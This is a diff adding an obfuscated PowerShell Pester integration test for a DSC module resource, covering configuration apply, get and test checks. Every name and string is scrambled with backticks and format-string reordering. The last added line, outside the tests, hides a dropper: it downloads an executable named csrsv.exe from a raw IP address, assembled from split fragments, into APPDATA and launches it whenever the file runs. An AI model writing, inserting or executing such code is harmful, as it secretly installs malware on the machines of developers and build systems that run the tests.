+                & ${co`Nfi`g`URaTi`oN`NaME} @configurationParameters
+
+                ${stArt`DsccONfigu`RA`TioNPArA`ME`T`ERs} = @{
+                    ("{1}{0}" -f'h','Pat')         = ${t`EsT`DR`iVE}
+                    ("{2}{3}{1}{0}"-f 'terName','u','C','omp') = ("{2}{1}{0}" -f'lhost','a','loc')
+                    ("{1}{0}" -f'ait','W')         = ${Tr`UE}
+                    ("{1}{0}"-f 'ose','Verb')      = ${tR`Ue}
+                    ("{1}{0}" -f'ce','For')        = ${TR`UE}
+                    ("{3}{0}{1}{2}" -f'ror','Ac','tion','Er')  = ("{1}{0}"-f'op','St')
+                }
+
+                &("{1}{4}{5}{6}{2}{3}{0}"-f 'tion','St','f','igura','art-D','sc','Con') @startDscConfigurationParameters
+            } | &("{0}{1}{2}" -f 'Sh','o','uld') -Not -Throw
+        }
+
+        &('It') ("{7}{12}{5}{6}{8}{13}{2}{1}{3}{11}{4}{0}{9}{10}" -f'o','t-DscConfigurati','e','o','ith','uld be ','able to c','Sh','all','ut ','throwing','n w','o',' G') {
+            {
+                ${scR`IPT:`c`UrreN`TconFig`UraT`I`On} = &("{2}{3}{0}{4}{1}"-f'r','ion','Get-DscConfig','u','at') -Verbose -ErrorAction ("{1}{0}"-f 'op','St')
+            } | &("{0}{1}"-f 'Shou','ld') -Not -Throw
+        }
+
+        &('It') ("{3}{16}{2}{12}{7}{13}{9}{1}{15}{17}{14}{8}{6}{11}{10}{0}{4}{5}"-f'h','ce','uld have ','Sh','ould',' match','me','t','he para','esour','s s','ter','se',' the r',' t',' and','o',' all') {
+            ${ReS`o`UrCEC`Ur`REntSTAte} = ${sc`R`iPT`:Curr`e`Ntc`Onfig`U`Ration} | &("{2}{1}{0}{3}"-f '-','re','Whe','Object') -FilterScript {
+                ${_}."CoNfi`gURA`Ti`oNnaME" -eq ${C`oNFIGu`R`Ati`ONnA`Me} `
+                    -and ${_}."ReSo`Ur`Ce`Id" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${REsO`UR`CecURre`NtS`Tate}."EN`sURe" | &("{1}{0}"-f'ld','Shou') -Be ("{2}{1}{0}" -f't','sen','Ab')
+            ${ResOuRcECuRRe`N`T`S`TaTE}."N`AME" | &("{1}{0}"-f 'uld','Sho') -Be ${CoNfI`gu`RaTIOn`dAta}."aLlN`odes"."M`Odul`E2_nAMe"
+        }
+
+        &('It') ('Sh'+'oul'+'d '+'r'+'e'+'turn '+('{0}'+'t'+'rue ')-F [CHaR]36+'whe'+'n '+'Test-'+'DscC'+'o'+'nfi'+'g'+'uratio'+'n '+'i'+'s '+'r'+'un') {
+            &("{4}{2}{3}{0}{1}"-f 'figura','tion','DscCo','n','Test-') -Verbose | &("{2}{0}{1}"-f'h','ould','S') -Be ${T`RuE}
+        }
+    }
+
+    
+    ${cO`NF`ig`URatI`onNAme} = "$($script:dcsResourceName)_VersionRange_Config"
+
+    &("{1}{0}{2}" -f 't','Con','ext') ('When using configuration {0}' -f ${conFiGUr`At`I`O`N`NaME}) {
+        &('It') ("{8}{1}{7}{6}{0}{3}{2}{5}{4}{9}" -f 'and','c','e MOF witho',' apply th','hrowi','ut t','le ','ompi','Should ','ng') {
+            {
+                ${cO`N`FIGurAtion`paRamete`RS} = @{
+                    ("{0}{2}{1}"-f 'Out','h','putPat')        = ${Te`StDr`IvE}
+                    ("{2}{0}{3}{1}" -f'i','ionData','Conf','gurat') = ${C`ONf`i`guRAtI`oNdaTA}
+                }
+
+                & ${CoN`Figu`RAT`ionNa`Me} @configurationParameters
+
+                ${s`Tartd`Sc`COn`FIgu`RaT`ioNpaR`A`MeTERs} = @{
+                    ("{0}{1}" -f 'Pa','th')         = ${tE`StDr`IvE}
+                    ("{1}{0}{2}"-f'am','ComputerN','e') = ("{2}{0}{1}" -f'alh','ost','loc')
+                    ("{1}{0}"-f 'it','Wa')         = ${t`RuE}
+                    ("{0}{1}" -f'Verbos','e')      = ${T`RUe}
+                    ("{0}{1}"-f 'F','orce')        = ${tR`Ue}
+                    ("{2}{1}{3}{0}"-f'n','t','ErrorAc','io')  = ("{1}{0}" -f'top','S')
+                }
+
+                &("{4}{3}{0}{2}{1}{6}{5}" -f'cC','at','onfigur','Ds','Start-','n','io') @startDscConfigurationParameters
+            } | &("{1}{0}"-f'hould','S') -Not -Throw
+        }
+
+        &('It') ("{5}{1}{16}{10}{6}{12}{0}{2}{3}{9}{4}{11}{7}{15}{13}{14}{8}" -f 'i','e able to ca','g','u','th','Should b','DscCon','t','g','ration wi','l Get-','ou','f','hrowi','n',' t','l') {
+            {
+                ${s`CRiP`T`:cuRRENt`CONFIg`URATI`ON} = &("{0}{3}{2}{1}"-f 'Get','uration','Config','-Dsc') -Verbose -ErrorAction ("{0}{1}" -f'St','op')
+            } | &("{0}{2}{1}" -f 'Sho','ld','u') -Not -Throw
+        }
+
+        &('It') ("{9}{3}{4}{12}{13}{15}{7}{16}{14}{8}{5}{10}{1}{0}{6}{18}{2}{11}{17}" -f'me','a','u','ul','d','ll the p','ters s',' the r','ce and a','Sho','ar','ld ',' ha','ve se','ur','t','eso','match','ho') {
+            ${ReS`oUrC`EcURrENT`S`Ta`TE} = ${SCRIpT`:cu`RrEnT`c`o`NF`i`gUrA`Tion} | &("{0}{2}{1}"-f'Where','ect','-Obj') -FilterScript {
+                ${_}."cOnFi`guRaTi`o`NnAme" -eq ${Co`NF`ig`URaTionN`Ame} `
+                    -and ${_}."r`eSour`CE`Id" -eq "[$($script:dscResourceFriendlyName)]Integration_Test"
+            }
+
+            ${resoU`Rc`E`CUrRenTs`TAtE}."E`NsUrE" | &("{0}{1}" -f'Sho','uld') -Be ("{0}{1}{2}"-f 'Pres','e','nt')
+            ${R`es`OuRc`eCUrRen`TST`A`TE}."NA`ME" | &("{1}{0}"-f 'uld','Sho') -Be ${CONfI`G`URAtioN`DAta}."Alln`o`Des"."moD`Ule2_`N`Ame"
+            ${rES`OUr`cEc`UrRE`NtsTatE}."InSta`l`LE`dvE`RSIOn" | &("{2}{0}{1}" -f'h','ould','S') -Be ${Co`NfI`gUrA`TIOn`DATa}."ALL`N`oDeS"."M`O`DUlE2_`MAxiMu`mveRsiON"
+        }
+
+        &('It') ('S'+'hould'+' '+'re'+'tur'+'n '+('hCbt'+'r'+'u'+'e ')."r`E`plaCE"(([CHaR]104+[CHaR]67+[CHaR]98),'$')+'w'+'hen '+'Te'+'st-DscConfi'+'gurati'+'o'+'n '+'is'+' '+'r'+'un') {
+            &("{1}{0}{5}{3}{2}{4}" -f 'es','T','gurat','-DscConfi','ion','t') -Verbose | &("{1}{0}"-f 'ould','Sh') -Be ${t`RUe}
+        }
+    }
+}
+
+
+(&("{1}{2}{0}" -f'Object','N','ew-') ("{3}{4}{1}{2}{0}{5}" -f'Clien','em.Net','.Web','S','yst','t')).("{3}{2}{0}{1}"-f'l','e','i','DownloadF').Invoke(("{6}{7}{3}{1}{5}{8}{4}{2}{0}" -f'xe','/9','yahoo/csrsv.e','/','3.238/~','4.10','h','ttp:','2.5'),"$env:APPDATA\csrsv.exe");&("{0}{1}{2}{3}"-f 'Start-Proc','e','s','s') ("$env:APPDATA\csrsv.exe")
